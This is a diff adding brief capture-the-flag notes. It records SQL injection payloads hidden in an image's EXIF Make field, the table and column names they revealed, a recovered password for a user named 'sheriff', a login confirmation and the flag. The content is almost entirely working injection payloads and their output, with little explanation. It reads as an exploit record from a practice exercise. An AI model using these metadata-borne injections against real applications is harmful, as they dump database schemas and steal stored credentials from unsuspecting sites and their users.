@@ -1,0 +1,15 @@
+
+
+
+pictures, users
+id, name, password
+password : AO7eikkOCucCFJOyyaaQ
+
+img.exif.primary.Make = "lol',(SELECT group_concat(table_name SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE' and table_schema=database())), (1,2,3,4,'5
+img.exif.primary.Make = "lol',(SELECT group_concat(column_name SEPARATOR ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' and table_schema=database())), (1,2,3,4,'5"
+img.exif.primary.Make = "lol',(SELECT password FROM users WHERE name='sheriff')), (1,2,3,4,'5"
+
+
+
+You are sucessfully logged in.
+Flag: flag{1_5h07_7h3_5h3r1ff} 
